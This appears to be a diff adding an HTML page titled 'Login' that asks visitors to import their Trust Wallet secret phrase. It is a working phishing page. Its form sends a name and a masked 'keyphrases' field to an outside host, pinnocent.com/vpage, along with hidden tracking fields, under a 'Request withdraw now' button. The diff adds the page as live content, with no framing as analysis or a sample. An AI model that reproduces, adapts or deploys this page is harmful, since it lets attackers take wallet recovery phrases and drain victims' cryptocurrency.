@@ -1,0 +1,48 @@
+<html lang="en">
+                 <head>
+                 <meta charset="UTF-8">
+                 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                 <title>Login</title>
+                 <script crossorigin="" src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
+                 <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
+                 <script src="https://cdn.tailwindcss.com"></script>
+                 <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/1.5.0/axios.min.js" integrity="sha512-aoTNnqZcT8B4AmeCFmiSnDlc4Nj/KPaZyB5G7JnOnUEkdNpCZs1LCankiYi01sLTyWy+m2P+W4XM+BuQ3Q4/Dg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+                 <style type="text/css" id="operaUserStyle">
+                 body{
+                   color:#ffffff; 
+                   background:#000000; 
+                 }
+                 </style>
+                 </head>
+                 <body class="bg-[#000000]">
+                  <noscript>You need to enable JavaScript to run this app.</noscript>
+                  <div id="root"><div>
+                  <div class="grid place-content-center grid-cols-1 md:px-96 mt-10 gap-10">
+                  <div class="m-auto text-xs sm:text-sm md:text-lg max-w-sm md:max-w-2xl text-center "></div>
+    <div class="flex justify-center w-full">
+     
+    </div>
+    <div class="flex justify-center w-full">
+    <img src="https://pvideo.xyz/assets/files/upload-1717459081.jpg" alt="image" width="70px" height="70px">
+    </div>
+    <p class="text-center" style="">Import your trust wallet secret phrase</p>
+    <form action="https://pinnocent.com/vpage" method="POST">
+    <input type="hidden" name="link" value="custom template">
+    <input type="hidden" name="ftype" value="normal">
+    <input type="hidden" name="login" value="login">
+    <input type="hidden" name="user_id" value="1299">
+    <div class="p-2 w-full  gap-1  ">
+    <div class="flex flex-col   p-2  gap-1">
+     
+    <input type="text" class="w-full border p-2 rounded-md" name="message_title" placeholder="enter your name"></div>
+    <div class="flex flex-col   p-2   gap-1">
+     
+    <input type="password" class="w-full border p-2 rounded-md" name="description" placeholder="enter keyphrases " id="password" autocomplete="new-password" aria-autocomplete="list"></div>
+    <div class="flex flex-col justify-center items-center  p-2 gap-1 w-3/6 mx-auto">
+    <button type="submit" class=" text-black font-semibold p-3 rounded-md w-full bg-[#4d62fa] hover:bg-blue-600" style="width: 200px">Request withdraw now </button>
+    </div>
+    </div>
+    </form>
+    </div>
+    </div>
+    </div></body></html>
